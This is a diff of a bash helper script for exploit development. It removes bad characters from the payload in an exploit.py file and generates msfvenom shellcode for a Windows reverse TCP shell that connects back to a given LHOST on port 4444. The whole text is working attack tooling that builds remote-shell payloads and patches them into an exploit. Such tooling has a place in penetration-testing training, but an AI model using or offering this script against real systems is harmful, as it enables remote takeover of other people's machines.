@@ -17,19 +17,23 @@ fi
 
 if [ -n "$badchars" ]
 then
-    echo -n "[+] Bad character shellcode: "
-    bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
-    echo "$bc"
+echo -n "[+] Bad character shellcode: "
+bc="$(echo ${badchars[@]} | sed 's/ /\\x/g' | sed 's/^/\\x/g' | tr '' '\n')"
+echo "$bc"
 
-    echo "[+] Bad character deduction: "
-    pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
-    badcharsreplacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | sed "$pattern" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}')
-    echo $badcharsreplacement
+echo "[+] Bad character deduction: "
+pattern=$(for i in ${badchars[@]}; do echo -n "s+x$i\\\++g; " ; done)
+badcharsreplacement=$(echo -E "payload = \"$(python2 badcharset.py)\"" | sed "$pattern" | gawk '/\\/{gsub(/\\/, "\\\\")};{print}')
+echo $badcharsreplacement
 
-    echo "[+] Modifying exploit.py payload with characterset without bad characters..."
-    cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
-    sed -i "/payload = \"\"/c $badcharsreplacement" exploit.py
+echo "[+] Modifying exploit.py payload with characterset without bad characters..."
+cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
+sed -i "/payload = \"\"/c $badcharsreplacement" exploit.py
+fi
 
-    echo -n "[+] msfvenom output: "
-    echo "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b $bc -f c)"
+if [ -n "$lhost" ]
+then
+echo -n "[+] msfvenom output: "
+cat exploit.py | sed -i 's/payload = ".*"$/payload = ""/g' exploit.py
+echo -E "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b "$bc" -f c)"
 fi
